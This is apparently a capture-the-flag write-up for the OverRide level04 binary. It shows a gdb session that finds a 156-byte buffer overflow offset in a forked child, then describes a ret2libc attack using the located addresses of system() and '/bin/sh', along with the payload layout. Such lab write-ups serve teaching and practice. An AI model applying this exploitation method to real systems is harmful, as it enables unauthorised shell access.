For this level, we have a child process executing and asking for input

with gdb, we can find where the overflow happen

(gdb) set follow-fork-mode child 

Then put a overflow pattern

level04@OverRide:~$ env - gdb ./level04 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/users/level04/level04...(no debugging symbols found)...done.
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) show env
(gdb) set follow-fork-mode child 
(gdb) run
Starting program: /home/users/level04/level04 
[New process 1801]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1801]
0x41326641 in ?? ()    ->>>> 156 offset

we can inject a shellcode and try to execute, the the problem is the main is preventing any execution of a execve() so it is impossible to get a shell

we can instead use a other method, Return-to-libc / ret2libc

As the libc is used in our program, we can access to the functions inside it, like system()

We need to find the address of the system function, and put it's address in the eip, and give it /bin/sh as argument

With '/bin/sh' in our buffer, we get

(gdb) print system                              
$5 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:	 "/bin/sh"

We need to build our exploit like that:


[ "/bin/sh" + padding ] [ Address system() ] [ Address retour ] [ Address "/bin/sh" ]








